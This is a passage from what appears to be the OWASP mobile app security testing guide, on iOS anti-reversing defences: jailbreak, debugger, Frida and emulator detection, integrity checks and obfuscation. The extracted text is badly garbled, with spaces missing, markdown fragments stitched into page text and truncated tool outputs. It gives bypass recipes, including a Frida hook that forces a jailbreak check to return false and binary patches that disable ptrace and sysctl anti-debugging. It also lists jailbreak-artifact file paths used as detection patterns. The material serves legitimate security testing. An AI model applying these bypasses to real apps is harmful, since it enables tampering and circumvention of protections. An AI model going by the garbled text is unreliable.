theactuallicenseverificationandcheckingwhichlibraries areinvolvedincaseofmissingsources. Itneedtobevalidatedwhetherthecopyrightsofthelicenseshavebeenadheredto. Thisoftenmeansthattheapplication shouldhaveanaboutorEULAsectioninwhichthecopy-rightstatementsarenotedasrequiredbythelicenseofthethird partylibrary. Listing Application Libraries When performing app analysis, it is important to also analyze the app dependencies (usually in form of libraries or so- called iOS Frameworks) and ensure that they don’t contain any vulnerabilities. Even when you don’t have the source code, you can still identify some of the app dependencies using tools likeobjection, MobSF or the otool -L command. Objectionistherecommendedtool,sinceitprovidesthemostaccurateresultsanditiseasytouse. Itcontainsamodule toworkwithiOSBundles,whichofferstwocommands: list_bundlesandlist_frameworks. Thelist_bundlescommandlistsalloftheapplication’sbundlesthatarenotrelatedtoFrameworks. Theoutputcontains executablename,bundleid,versionofthelibraryandpathtothelibrary. ...itudehacks.DVIAswiftv2.developon (iPhone:13.2.3)[usb] #iosbundleslist_bundles Executable Bundle Version Path ##MakeSureThatFreeSecurityFeaturesAreActivated >**Platform:**ios > >**MASVSV1:**MSTG-CODE-9 > >**MASVSV2:**MASVS-CODE-4 ###Overview ###StaticAnalysis Youcanuseradare2tocheckthebinarysecurityfeatures. Let'susethe[DamnVulnerableiOSAppDVIAv1](https://github.com/prateek147/DVIA/)asanexample.Openitsmainbinarywithradare2: ```bash r2DamnVulnerableIOSApp Andrunthefollowingcommands: [0x1000180c8]>i~pic,canary canary true pic true [0x1000180c8]>is~release,retain 124 0x002951e00x1000891e0LOCAL FUNC0 imp.dispatch_release 149 0x00294e800x100088e80LOCAL FUNC0 imp.objc_autorelease 150 0x00294e8c0x100088e8cLOCAL FUNC0 imp.objc_autoreleasePoolPop 151 0x00294e980x100088e98LOCAL FUNC0 imp.objc_autoreleasePoolPush 152 0x00294ea40x100088ea4LOCAL FUNC0 imp.objc_autoreleaseReturnValue 165 0x00294f400x100088f40LOCAL FUNC0 imp.objc_release 167 0x00294f580x100088f58LOCAL FUNC0 imp.objc_retainAutorelease 168 0x00294f640x100088f64LOCAL FUNC0 imp.objc_retainAutoreleaseReturnValue 169 0x00294f700x100088f70LOCAL FUNC0 imp.objc_retainAutoreleasedReturnValue Allthefeaturesareenabledintheseexamples: • PIE(PositionIndependentExecutable): indicatedbytheflagpic true. – Appliestoallappsindependentlyofthelanguageused. – Appliesonlytothemainexecutable(MH_EXECUTE),nottodynamiclibraries(MH_DYLIB). • StackCanary: indicatedbytheflagcanary true. – AppliestoappscontainingObjective-Ccode. – NotnecessarilyrequiredforpureSwiftapps(Swiftismemorysafebydesign). – EspeciallyimportantforappscontainingC/C++code,astheyprovidedirectaccesstomemoryandpointers, makingthemmorevulnerabletobufferoverflows. 505\n• ARC (Automatic Reference Counting): indicated by symbols such as objc_autorelease or objc_retainAutore- lease. – ImportantforbinariescontainingObjective-Ccode. – ForbinarieswrittenpurelyinSwift,ARCisenabledbydefault. – ARC is not relevant for binaries written purely in C/C++, as it’s a memory management feature specific to Objective-CandSwift. Dynamic Analysis Thesecheckscanbeperformeddynamicallyusingobjection. Here’soneexample: com.yourcompany.PPClienton (iPhone:13.2.3)[usb] #iosinfobinary Name Type Encrypted PIE ARC Canary StackExec RootSafe --- masvs_category:MASVS-RESILIENCE platform:ios --- #iOSAnti-ReversingDefenses ##Overview Thischaptercoversdefense-in-depthmeasuresrecommendedforappsthatprocess,orgiveaccessto,sensitivedataorfunctionality.Researchshows that[many ↪ AppStoreappsoftenincludethesemeasures](https://seredynski.com/articles/a-security-review-of-1-300-appstore-applications "Asecurityreviewof1,300 ↪ AppStoreapplications-5April2020"). Thesemeasuresshouldbeappliedasneeded,basedonanassessmentoftheriskscausedbyunauthorizedtamperingwiththe appand/orreverseengineeringofthe ↪ code. -Appsmustneverusethesemeasuresasareplacementforsecuritycontrols,andarethereforeexpectedtofulfillother baselinesecuritymeasuressuchasthe ↪ restoftheMASVSsecuritycontrols. -Appsshouldcombinethesemeasurescleverlyinsteadofusingthemindividually.Thegoalistodiscouragereverseengineersfrom performingfurtheranalysis. -Integratingsomeofthecontrolsintoyourappmightincreasethecomplexityofyourappandevenhavean impactonitsperformance. YoucanlearnmoreaboutprinciplesandtechnicalrisksofreverseengineeringandcodemodificationintheseOWASPdocuments: -[OWASPArchitecturalPrinciplesThatPreventCodeModificationorReverse ↪ Engineering](https://wiki.owasp.org/index.php/OWASP_Reverse_Engineering_and_Code_Modification_Prevention_Project "OWASPArchitecturalPrinciplesThat ↪ PreventCodeModificationorReverseEngineering") -[OWASPTechnicalRisksofReverseEngineeringandUnauthorizedCode ↪ Modification](https://wiki.owasp.org/index.php/Technical_Risks_of_Reverse_Engineering_and_Unauthorized_Code_Modification "OWASPTechnicalRisksofReverse ↪ EngineeringandUnauthorizedCodeModification") ###GeneralDisclaimer The**lackofanyofthesemeasuresdoesnotcauseavulnerability**-instead,theyaremeanttoincreasetheapp'sresilienceagainstreverseengineeringand ↪ specificclient-sideattacks. Noneofthesemeasurescanassurea100%effectiveness,asthereverseengineerwillalwayshavefullaccesstothe deviceandwillthereforealwayswin(given ↪ enoughtimeandresources)! Forexample,preventingdebuggingisvirtuallyimpossible.Iftheappispubliclyavailable,itcanberunonanuntrusted devicethatisunderfullcontrolof ↪ theattacker.Averydeterminedattackerwilleventuallymanagetobypassalltheapp'santi-debugging controlsbypatchingtheappbinaryorbydynamically ↪ modifyingtheapp'sbehavioratruntimewithtoolssuchasFrida. ###JailbreakDetection Jailbreakdetectionmechanismsareaddedtoreverseengineeringdefensetomakerunningtheapponajailbrokendevicemoredifficult. Thisblockssomeofthe ↪ toolsandtechniquesreverseengineersliketouse.Likemostothertypesofdefense,jailbreakdetectionisnotveryeffective byitself,butscattering ↪ checksthroughouttheapp'ssourcecodecanimprovetheeffectivenessoftheoverallanti-tamperingscheme. >YoucanlearnmoreaboutJailbreak/RootDetectionintheresearchstudy ["Jailbreak/RootDetectionEvasionStudyoniOSand ↪ Android"](https://github.com/crazykid95/Backup-Mobile-Security-Report/blob/master/Jailbreak-Root-Detection-Evasion-Study-on-iOS-and-Android.pdf ↪ "Jailbreak/RootDetectionEvasionStudyoniOSandAndroid")byDanaGeistandMaratNigmatullin. ####CommonJailbreakDetectionChecks Herewepresentthreetypicaljailbreakdetectiontechniques: **File-basedChecks:** Theappmightbecheckingforfilesanddirectoriestypicallyassociatedwithjailbreaks,suchas: ```default /Applications/Cydia.app /Applications/FakeCarrier.app /Applications/Icy.app /Applications/IntelliScreen.app /Applications/MxTube.app /Applications/RockApp.app /Applications/SBSettings.app /Applications/WinterBoard.app /Applications/blackra1n.app 506\n/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist /Library/MobileSubstrate/DynamicLibraries/Veency.plist /Library/MobileSubstrate/MobileSubstrate.dylib /System/Library/LaunchDaemons/com.ikey.bbot.plist /System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist /bin/bash /bin/sh /etc/apt /etc/ssh/sshd_config /private/var/lib/apt /private/var/lib/cydia /private/var/mobile/Library/SBSettings/Themes /private/var/stash /private/var/tmp/cydia.log /var/tmp/cydia.log /usr/bin/sshd /usr/libexec/sftp-server /usr/libexec/ssh-keysign /usr/sbin/sshd /var/cache/apt /var/lib/apt /var/lib/cydia /usr/sbin/frida-server /usr/bin/cycript /usr/local/bin/cycript /usr/lib/libcycript.dylib /var/log/syslog CheckingFilePermissions: Theappmightbetryingtowritetoalocationthat’soutsidetheapplication’ssandbox. Forinstance,itmayattemptto createafilein,forexample,the/privatedirectory. Ifthefileiscreatedsuccessfully,theappcanassumethatthedevice hasbeenjailbroken. do{ letpathToFileInRestrictedDirectory ="/private/jailbreak.txt" try"Thisisatest.".write(toFile:pathToFileInRestrictedDirectory,atomically:true,encoding:String.Encoding.utf8) tryFileManager.default.removeItem(atPath:pathToFileInRestrictedDirectory) //Deviceisjailbroken }catch { //Deviceisnotjailbroken } CheckingProtocolHandlers: Theappmightbeattemptingtocallwell-knownprotocolhandlerssuchascydia://(availablebydefaultafterinstalling Cydia). ifleturl=URL(string:"cydia://package/com.example.package"),UIApplication.shared.canOpenURL(url){ //Deviceisjailbroken } Automated Jailbreak Detection Bypass ThequickestwaytobypasscommonJailbreakdetectionmechanismsisobjection. Youcanfindtheimplementationofthe jailbreakbypassinthejailbreak.tsscript. Manual Jailbreak Detection Bypass Iftheautomatedbypassesaren’teffectiveyouneedtogetyourhandsdirtyandreverseengineertheappbinariesuntil youfindthepiecesofcoderesponsibleforthedetectionandeitherpatchthemstaticallyorapplyruntimehookstodisable them. Step1: ReverseEngineering: Whenyouneedtoreverseengineerabinarylookingforjailbreakdetection,themostobviouswayistosearchforknown strings,suchas“jail”or“jailbreak”. Notethatthiswon’tbealwayseffective,especiallywhenresiliencemeasuresarein placeorsimplywhenthethedeveloperhasavoidedsuchobviousterms. Example: DownloadtheDamnVulnerableiOSapplication(DVIA-v2),unzipit,loadthemainbinaryintoradare2andwait fortheanalysistocomplete. 507\nr2-A./DVIA-v2-swift/Payload/DVIA-v2.app/DVIA-v2 Nowyoucanlistthebinary’ssymbolsusingtheiscommandandapplyacase-insensitivegrep(~+)forthestring“jail”. [0x1001a9790]>is~+jail ... 2230 0x001949a80x1001949a8GLOBALFUNC0 DVIA_v2.JailbreakDetectionViewController.isJailbroken.allocator__Bool 7792 0x0016d2d80x10016d2d8LOCAL FUNC0 +[JailbreakDetectionisJailbroken] ... Asyoucansee,there’saninstancemethodwiththesignature-[JailbreakDetectionVC isJailbroken]. Step2: DynamicHooks: NowyoucanuseFridatobypassjailbreakdetectionbyperformingtheso-calledearlyinstrumentation,thatis,byreplacing functionimplementationrightatstartup. Usefrida-traceonyourhostcomputer: frida-trace -U-f/Applications/DamnVulnerableIOSApp.app/DamnVulnerableIOSApp -m"-[JailbreakDetectionVCisJailbroken]" This will start the app, trace calls to -[JailbreakDetectionVC isJailbroken], and create a JavaScript hook for each matchingelement. Open./__handlers__/__JailbreakDetectionVC_isJailbroken_.jswithyourfavouritteeditorand edit the onLeave callback function. You can simply replace the return value using retval.replace() to always return 0: onLeave:function (log,retval,state){ console.log("Function[JailbreakDetectionVCisJailbroken]originallyreturned:"+retval); retval.replace(0); console.log("Changingthereturnvalueto:"+retval); } Thiswillprovidethefollowingoutput: $frida-trace -U-f/Applications/DamnVulnerableIOSApp.app/DamnVulnerableIOSApp -m"-[JailbreakDetectionVCisJailbroken]:" Instrumentingfunctions... `... -[JailbreakDetectionVCisJailbroken]:Loadedhandlerat "./__handlers__/__JailbreakDetectionVC_isJailbroken_.js" Startedtracing1function.PressCtrl+Ctostop. Function[JailbreakDetectionVCisJailbroken]originallyreturned:0x1 Changingthereturnvalueto:0x0 Anti-Debugging Detection Exploringapplicationsusingadebuggerisaverypowerfultechniqueduringreversing. Youcannotonlytrackvariables containingsensitivedataandmodifythecontrolflowoftheapplication,butalsoreadandmodifymemoryandregisters. There are several anti-debugging techniques applicable to iOS which can be categorized as preventive or as reactive. When properly distributed throughout the app, these techniques act as a supportive measure to increase the overall resilience. • Preventivetechniquesactasafirstlineofdefensetoimpedethedebuggerfromattachingtotheapplicationatall. • Reactivetechniquesallowtheapplicationtodetectthepresenceofadebuggerandhaveachancetodivergefrom normalbehavior. Using ptrace Asseeninchapter“TamperingandReverseEngineeringoniOS”,theiOSXNUkernelimplementsaptracesystemcall that’s lacking most of the functionality required to properly debug a process (e.g. it allows attaching/stepping but not read/writeofmemoryandregisters). Nevertheless,theiOSimplementationoftheptracesyscallcontainsanonstandardandveryusefulfeature: preventing thedebuggingofprocesses. ThisfeatureisimplementedasthePT_DENY_ATTACHrequest,asdescribedintheofficialBSD SystemCallsManual. Insimplewords,itensuresthatnootherdebuggercanattachtothecallingprocess;ifadebugger attemptstoattach, the processwillterminate. UsingPT_DENY_ATTACH isafairly well-knownanti-debuggingtechnique, soyoumayencounteritoftenduringiOSpentests. 508\nBeforedivingintothedetails,itisimportanttoknowthatptraceisnotpartofthepubliciOSAPI.Non-publicAPIs areprohibited,andtheAppStoremayrejectappsthatincludethem. Becauseofthis,ptraceisnotdirectlycalled inthecode;it’scalledwhenaptracefunctionpointerisobtainedviadlsym. Thefollowingisanexampleimplementationoftheabovelogic: #import <dlfcn.h> #import <sys/types.h> #import <stdio.h> typedef int(*ptrace_ptr_t)(int_request,pid_t_pid,caddr_t_addr,int_data); void anti_debug(){ ptrace_ptr_tptrace_ptr =(ptrace_ptr_t)dlsym(RTLD_SELF,"ptrace"); ptrace_ptr(31,0,0,0);//PTRACE_DENY_ATTACH=31 } Bypass: Todemonstratehowtobypassthistechniquewe’lluseanexampleofadisassembledbinarythatimplements thisapproach: Let’sbreakdownwhat’shappeninginthebinary. dlsymiscalledwithptraceasthesecondargument(registerR1). The return value in register R0 is moved to register R6 at offset 0x1908A. At offset 0x19098, the pointer value in register R6 is called using the BLX R6 instruction. To disable the ptrace call, we need to replace the instruction BLX R6 (0xB0 0x47inLittleEndian)withtheNOP(0x00 0xBFinLittleEndian)instruction. Afterpatching,thecodewillbesimilartothe following: Armconverter.comisahandytoolforconversionbetweenbytecodeandinstructionmnemonics. Bypassesforotherptrace-basedanti-debuggingtechniquescanbefoundin“DefeatingAnti-DebugTechniques: macOS ptracevariants”byAlexanderO’Mara. Using sysctl Anotherapproachtodetectingadebuggerthat’sattachedtothecallingprocessinvolvessysctl. AccordingtotheApple documentation,itallowsprocessestosetsysteminformation(ifhavingtheappropriateprivileges)orsimplytoretrieve systeminformation(suchaswhetherornottheprocessisbeingdebugged). However,notethatjustthefactthatanapp usessysctlmightbeanindicatorofanti-debuggingcontrols,thoughthiswon’tbealwaysbethecase. TheAppleDocumentationArchiveincludesanexamplewhichcheckstheinfo.kp_proc.p_flagflagreturnedbythecall tosysctlwiththeappropriateparameters. AccordingtoApple,youshouldn’tusethiscodeunlessit’sforthedebug buildofyourprogram. 509\nBypass: Onewaytobypassthischeckisbypatchingthebinary. Whenthecodeaboveiscompiled,thedisassembled versionofthesecondhalfofthecodeissimilartothefollowing: Aftertheinstructionatoffset0xC13C,MOVNE R0, #1ispatchedandchangedtoMOVNE R0, #0(0x000x20ininbytecode), thepatchedcodeissimilartothefollowing: You can also bypass a sysctl check by using the debugger itself and setting a breakpoint at the call to sysctl. This approachisdemonstratediniOSAnti-DebuggingProtections#2. Using getppid Applications on iOS can detect if they have been started by a debugger by checking their parent PID. Normally, an applicationisstartedbythelaunchdprocess,whichisthefirstprocessrunningintheusermodeandhasPID=1. However, ifadebuggerstartsanapplication,wecanobservethatgetppidreturnsaPIDdifferentthan1. Thisdetectiontechnique canbeimplementedinnativecode(viasyscalls),usingObjective-CorSwiftasshownhere: 510\nfuncAmIBeingDebugged()->Bool{ returngetppid()!=1 } Bypass: Similarly to the other techniques, this has also a trivial bypass (e.g. by patching the binary or by using Frida hooks). File Integrity Checks Therearetwocommonapproachestocheckfileintegrity: usingapplicationsourcecodeintegritychecksandusingfile storageintegritychecks. Application Source Code Integrity Checks Inthe“TamperingandReverseEngineeringoniOS”chapter,wediscussedtheiOSIPAapplicationsignaturecheck. Wealso sawthatdeterminedreverseengineerscanbypassthischeckbyre-packagingandre-signinganappusingadeveloper orenterprisecertificate. Onewaytomakethisharderistoaddacustomcheckthatdetermineswhetherthesignatures stillmatchatruntime. AppletakescareofintegritycheckswithDRM.However,additionalcontrols(suchasintheexamplebelow)arepossible. Themach_headerisparsedtocalculatethestartoftheinstructiondata,whichisusedtogeneratethesignature. Next, thesignatureiscomparedtothegivensignature. Makesurethatthegeneratedsignatureisstoredorcodedsomewhere else. intxyz(char *dst){ const struct mach_header *header; Dl_infodlinfo; if(dladdr(xyz,&dlinfo)==0||dlinfo.dli_fbase ==NULL){ NSLog(@"Error:Couldnotresolvesymbolxyz"); [NSThreadexit]; } while(1){ header =dlinfo.dli_fbase; //PointerontheMach-Oheader struct load_command *cmd=(struct load_command *)(header +1);//Firstloadcommand //Nowiteratethroughloadcommand //tofind__textsectionof__TEXTsegment for(uint32_t i=0;cmd!=NULL && i<header->ncmds;i++){ if(cmd->cmd==LC_SEGMENT){ //__TEXTloadcommandisaLC_SEGMENTloadcommand struct segment_command *segment =(struct segment_command *)cmd; if(!strcmp(segment->segname,"__TEXT")){ //Stopon__TEXTsegmentloadcommandandgothroughsections //tofind__textsection struct section *section =(struct section *)(segment +1); for(uint32_t j=0;section !=NULL && j<segment->nsects;j++){ if(!strcmp(section->sectname,"__text")) break;//Stopon__textsectionloadcommand section =(struct section *)(section +1); } //Getherethe__textsectionaddress,the__textsectionsize //andthevirtualmemoryaddresssowecancalculate //apointeronthe__textsection uint32_t *textSectionAddr =(uint32_t *)section->addr; uint32_t textSectionSize =section->size; uint32_t *vmaddr =segment->vmaddr; char *textSectionPtr =(char *)((int)header +(int)textSectionAddr -(int)vmaddr); //Calculatethesignatureofthedata, //storetheresultinastring //andcomparetotheoriginalone unsigned char digest[CC_MD5_DIGEST_LENGTH]; CC_MD5(textSectionPtr,textSectionSize,digest); //calculatethesignature for(inti=0;i<sizeof(digest);i++) //fillsignature sprintf(dst+(2*i),"%02x",digest[i]); //returnstrcmp(originalSignature,signature)==0; //verifysignaturesmatch return 0; } } cmd=(struct load_command *)((uint8_t *)cmd+cmd->cmdsize); } } } 511\nBypass: 1. Patchtheanti-debuggingfunctionalityanddisabletheunwantedbehaviorbyoverwritingtheassociatedcodewith NOPinstructions. 2. Patchanystoredhashthat’susedtoevaluatetheintegrityofthecode. 3. UseFridatohookfilesystemAPIsandreturnahandletotheoriginalfileinsteadofthemodifiedfile. File Storage Integrity Checks Apps might choose to ensure the integrity of the application storage itself, by creating an HMAC or signature over ei- ther a given key-value pair or a file stored on the device, e.g. in the Keychain, UserDefaults/NSUserDefaults, or any database. Forexample,anappmightcontainthefollowingcodetogenerateanHMACwithCommonCrypto: //Allocateabuffertoholdthedigestandperformthedigest. NSMutableData*actualData =[getData]; //getthekeyfromthekeychain NSData*key=[getKey]; NSMutableData*digestBuffer =[NSMutableDatadataWithLength:CC_SHA256_DIGEST_LENGTH]; CCHmac(kCCHmacAlgSHA256,[actualDatabytes],(CC_LONG)[keylength],[actualDatabytes],(CC_LONG)[actualDatalength],[digestBuffermutableBytes]); [actualDataappendData:digestBuffer]; Thisscriptperformsthefollowingsteps: 1. GetthedataasNSMutableData. 2. Getthedatakey(typicallyfromtheKeychain). 3. Calculatethehashvalue. 4. Appendthehashvaluetotheactualdata. 5. Storetheresultsofstep4. Afterthat,itmightbeverifyingtheHMACsbydoingthefollowing: NSData*hmac =[datasubdataWithRange:NSMakeRange(data.length -CC_SHA256_DIGEST_LENGTH,CC_SHA256_DIGEST_LENGTH)]; NSData*actualData =[datasubdataWithRange:NSMakeRange(0,(data.length -hmac.length))]; NSMutableData*digestBuffer =[NSMutableDatadataWithLength:CC_SHA256_DIGEST_LENGTH]; CCHmac(kCCHmacAlgSHA256,[actualDatabytes],(CC_LONG)[keylength],[actualDatabytes],(CC_LONG)[actualDatalength],[digestBuffermutableBytes]); return [hmacisEqual:digestBuffer]; 1. ExtractsthemessageandthehmacbytesasseparateNSData. 2. Repeatssteps1-3oftheprocedureforgeneratinganHMAContheNSData. 3. ComparestheextractedHMACbytestotheresultofstep1. Note: iftheappalsoencryptsfiles,makesurethatitencryptsandthencalculatestheHMACasdescribedinAuthenticated Encryption. Bypass: 1. Retrievethedatafromthedevice,asdescribedinthe“DeviceBinding”section. 2. Altertheretrieveddataandreturnittostorage. Reverse Engineering Tools Detection Thepresenceoftools, frameworksandappscommonlyusedbyreverseengineersmayindicateanattempttoreverse engineer the app. Some of these tools can only run on a jailbroken device, while others force the app into debugging modeordependonstartingabackgroundserviceonthemobilephone. Therefore,therearedifferentwaysthatanapp mayimplementtodetectareverseengineeringattackandreacttoit,e.g.byterminatingitself. Youcandetectpopularreverseengineeringtoolsthathavebeeninstalledinanunmodifiedformbylookingforassociated applicationpackages,files,processes,orothertool-specificmodificationsandartifacts. Inthefollowingexamples,we’ll discussdifferentwaystodetecttheFridainstrumentationframework,whichisusedextensivelyinthisguideandalsoin therealworld. Othertools,suchasCydiaSubstrateorCycript,canbedetectedsimilarly. Notethatinjection,hookingand DBI(DynamicBinaryInstrumentation)toolscanoftenbedetectedimplicitly,throughruntimeintegritychecks,whichare discussedbelow. 512\nBypass: Thefollowingstepsshouldguideyouwhenbypassingdetectionofreverseengineeringtools: 1. Patch the anti reverse engineering functionality. Disable the unwanted behavior by patching the binary through usageofradare2/iaitoorGhidra. 2. UseFridaorCydiaSubstratetohookfilesystemAPIsontheObjective-C/Swiftornativelayers. Returnahandleto theoriginalfile,notthemodifiedfile. Refertothechapter“TamperingandReverseEngineeringoniOS”forexamplesofpatchingandcodeinjection. Frida Detection Fridarunsunderthenameoffrida-serverinitsdefaultconfiguration(injectedmode)onajailbrokendevice. Whenyou explicitlyattachtoatargetapp(e.g.viafrida-traceortheFridaCLI),Fridainjectsafrida-agentintothememoryofthe app. Therefore, you may expect to find it there after attaching to the app (and not before). On Android, verifying this isprettystraightforwardasyoucansimplygrepforthestring“frida”inthememorymapsoftheprocessIDintheproc directory(/proc/<pid>/maps). However,oniOStheprocdirectoryisnotavailable,butyoucanlisttheloadeddynamic librariesinanappwiththefunction_dyld_image_count. Fridamayalsorunintheso-calledembeddedmode,whichalsoworksfornon-jailbrokendevices. Itconsistsofembedding afrida-gadgetintotheIPAandforcingtheapptoloaditasoneofitsnativelibraries. The application’s static content, including its ARM-compiled binary and its external libraries, is stored inside the <Application>.app directory. If you inspect the content of the /var/containers/Bundle/Application/<UUID>/ <Application>.appdirectory,you’llfindtheembeddedfrida-gadgetasFridaGadget.dylib. iPhone:/var/containers/Bundle/Application/AC5DC1FD-3420-42F3-8CB5-E9D77C4B287A/SwiftSecurity.app/Frameworksroot#ls -alh total87M drwxr-xr-x10_installd_installd 320Nov1906:08./ drwxr-xr-x11_installd_installd 352Nov1906:08../ -rw-r--r-- 1_installd_installd 70MNov1606:37FridaGadget.dylib -rw-r--r-- 1_installd_installd3.8MNov1606:37libswiftCore.dylib -rw-r--r-- 1_installd_installd 71KNov1606:37libswiftCoreFoundation.dylib -rw-r--r-- 1_installd_installd136KNov1606:38libswiftCoreGraphics.dylib -rw-r--r-- 1_installd_installd 99KNov1606:37libswiftDarwin.dylib -rw-r--r-- 1_installd_installd189KNov1606:37libswiftDispatch.dylib -rw-r--r-- 1_installd_installd1.9MNov1606:38libswiftFoundation.dylib -rw-r--r-- 1_installd_installd 76KNov1606:37libswiftObjectiveC.dylib LookingatthesetracesthatFridaleavesbehind,youmightalreadyimaginethatdetectingFridawouldbeatrivialtask. Andwhileitistrivialtodetecttheselibraries,itisequallytrivialtobypasssuchadetection. Detectionoftoolsisacat andmousegameandthingscangetmuchmorecomplicated. Thefollowingtableshortlypresentsasetofsometypical Fridadetectionmethodsandashortdiscussionontheireffectiveness. SomeofthefollowingdetectionmethodsareimplementedintheiOSSecuritySuite. 513\nMethod Description Discussion CheckTheEnvironmentFor Artifactscanbepackagedfiles, Inspectingrunningservicesisnot RelatedArtifacts binaries,libraries,processes,and possibleforaniOSappona temporaryfiles. ForFrida,thiscould non-jailbrokendevice. TheSwift bethefrida-serverrunninginthe methodCommandLineisnot target(jailbroken)system(the availableoniOStoqueryfor daemonresponsibleforexposing informationaboutrunningprocesses, FridaoverTCP)orthefridalibraries butthereareunofficialways,suchas loadedbytheapp. byusingNSTask. Neverthelesswhen usingthismethod,theappwillbe rejectedduringtheAppStorereview process. ThereisnootherpublicAPI availabletoqueryforrunning processesorexecutesystem commandswithinaniOSApp. Evenif itwouldbepossible,bypassingthis wouldbeaseasyasjustrenamingthe correspondingFridaartifact (frida-server/frida-gadget/frida-agent). AnotherwaytodetectFrida,wouldbe towalkthroughthelistofloaded librariesandcheckforsuspicious ones(e.g.thoseincluding“frida”in theirnames),whichcanbedoneby using_dyld_get_image_name. CheckingForOpenTCPPorts Thefrida-serverprocessbindstoTCP Thismethoddetectsfrida-serverinits port27042bydefault. Testing defaultmode,butthelisteningport whetherthisportisopenisanother canbechangedviaacommandline methodofdetectingthedaemon. argument,sobypassingthisisvery trivial. CheckingForPortsResponding frida-serverusestheD-Bus Thisisafairlyrobustmethodof ToD-BusAuth protocoltocommunicate,soyoucan detectingfrida-server,butFrida expectittorespondtoD-BusAUTH. offersalternativemodesofoperation SendaD-BusAUTHmessagetoevery thatdon’trequirefrida-server. openportandcheckforananswer, hopingthatfrida-serverwillreveal itself. Pleaserememberthatthistableisfarfromexhaustive. Forexample,twootherpossibledetectionmechanismsare: • namedpipes(usedbyfrida-serverforexternalcommunication),or • detectingtrampolines(see“PreventbypassingofSSLcertificatepinninginiOSapplications”forfurtherexplanation andsamplecodefordetectionoftrampolinesinaniOSapp) Both would help to detect Substrate or Frida’s Interceptor but, for example, won’t be effective against Frida’s Stalker. Rememberthatthesuccessofeachofthesedetectionmethodswilldependonwhetheryou’reusingajailbrokendevice, thespecificversionofthejailbreakandmethodand/ortheversionofthetoolitself. Attheend,thisispartofthecatand mousegameofprotectingdatabeingprocessedonanuncontrolledenvironment(theenduser’sdevice). Emulator Detection The goal of emulator detection is to increase the difficulty of running the app on an emulated device. This forces the reverse engineer to defeat the emulator checks or utilize the physical device, thereby barring the access required for large-scaledeviceanalysis. 514\nAsdiscussedinthesectionTestingontheiOSSimulatorinthebasicsecuritytestingchapter,theonlyavailablesimulator istheonethatshipswithXcode. Simulatorbinariesarecompiledtox86codeinsteadofARMcodeandappscompiled forarealdevice(ARMarchitecture)don’truninthesimulator,hencesimulationprotectionwasnotsomuchaconcern regardingiOSappsincontrasttoAndroidwithawiderangeofemulationchoicesavailable. However, since its release, Corellium (commercial tool) has enabled real emulation, setting itself apart from the iOS simulator. Inadditiontothat,beingaSaaSsolution,Corelliumenableslarge-scaledeviceanalysiswiththelimitingfactor justbeingavailablefunds. WithAppleSilicon(ARM)hardwarewidelyavailable,traditionalchecksforthepresenceofx86/x64architecturemight notsuffice. Onepotentialdetectionstrategyistoidentifyfeaturesandlimitationsavailableforcommonlyusedemulation solutions. For instance, Corellium doesn’t support iCloud, cellular services, camera, NFC, Bluetooth, App Store access or GPU hardware emulation (Metal). Therefore, smartly combining checks involving any of these features could be an indicatorforthepresenceofanemulatedenvironment. Pairingtheseresultswiththeonesfrom3rdpartyframeworkssuchasiOSSecuritySuite,Trusteerorano-codesolution suchasAppdome(commercialsolution)willprovideagoodlineofdefenseagainstattacksutilizingemulators. Obfuscation Thechapter“MobileAppTamperingandReverseEngineering”introducesseveralwell-knownobfuscationtechniquesthat canbeusedinmobileappsingeneral. Name Obfuscation Thestandardcompilergeneratesbinarysymbolsbasedonclassandfunctionnamesfromthesourcecode. Therefore,if noobfuscationwasapplied,symbolnamesremainmeaningfulandcanbeeasilyreadstraightfromtheappbinary. For instance, afunctionwhichdetectsajailbreakcanbelocatedbysearchingforrelevantkeywords(e.g.“jailbreak”). The listingbelowshowsthedisassembledfunctionJailbreakDetectionViewController.jailbreakTest4Tappedfromthe DamnVulnerableiOSApp(DVIA-v2). __T07DVIA_v232JailbreakDetectionViewControllerC20jailbreakTest4TappedyypF: stp x22,x21,[sp,#-0x30]! mov rbp,rsp Aftertheobfuscationwecanobservethatthesymbol’snameisnolongermeaningfulasshownonthelistingbelow. __T07DVIA_v232zNNtWKQptikYUBNBgfFVMjSkvRdhhnbyyFySbyypF: stp x22,x21,[sp,#-0x30]! mov rbp,rsp Nevertheless,thisonlyappliestothenamesoffunctions,classesandfields. Theactualcoderemainsunmodified,soan attackercanstillreadthedisassembledversionofthefunctionandtrytounderstanditspurpose(e.g.toretrievethelogic ofasecurityalgorithm). Instruction Substitution This technique replaces standard binary operators like addition or subtraction with more complex representations. For exampleanadditionx = a + bcanberepresentedasx = -(-a) - (-b). However, usingthesamereplacementrepre- sentation could be easily reversed, so it is recommended to add multiple substitution techniques for a single case and introducearandomfactor. Thistechniqueisvulnerabletodeobfuscation,butdependingonthecomplexityanddepthof thesubstitutions,applyingitcanstillbetimeconsuming. Control Flow Flattening Controlflowflatteningreplacesoriginalcodewithamorecomplexrepresentation. Thetransformationbreaksthebodyof afunctionintobasicblocksandputsthemallinsideasingleinfiniteloopwithaswitchstatementthatcontrolstheprogram flow. This makes the program flow significantly harder to follow because it removes the natural conditional constructs thatusuallymakethecodeeasiertoread. Theimageshowshowcontrolflowflatteningalterscode. See“ObfuscatingC++programsviacontrolflowflattening”for moreinformation. 515\nDead Code Injection Thistechniquemakestheprogram’scontrolflowmorecomplexbyinjectingdeadcodeintotheprogram. Deadcodeisa stubofcodethatdoesn’taffecttheoriginalprogram’sbehaviourbutincreasestheoverheadforthereverseengineering process. String Encryption Applications are often compiled with hardcoded keys, licences, tokens and endpoint URLs. By default, all of them are storedinplaintextinthedatasectionofanapplication’sbinary. Thistechniqueencryptsthesevaluesandinjectsstubs ofcodeintotheprogramthatwilldecryptthatdatabeforeitisusedbytheprogram. Recommended Tools • SwiftShieldcanbeusedtoperformnameobfuscation. ItreadsthesourcecodeoftheXcodeprojectandreplaces allnamesofclasses,methodsandfieldswithrandomvaluesbeforethecompilerisused. • obfuscator-llvm operates on the Intermediate Representation (IR) instead of the source code. It can be used for symbolobfuscation,stringencryptionandcontrolflowflattening. Sinceit’sbasedonIR,itcanhideoutsignificantly moreinformationabouttheapplicationascomparedtoSwiftShield. LearnmoreaboutiOSobfuscationtechniquesinthepaper“ProtectingMillion-UseriOSAppswithObfuscation: Motivations, Pitfalls,andExperience”. Device Binding The purpose of device binding is to impede an attackerwho tries to copy an app and its state fromdevice A to device B and continue the execution of the app on device B. After device A has been determined trusted, it may have more privilegesthandeviceB.Thissituationshouldn’tchangewhenanappiscopiedfromdeviceAtodeviceB. 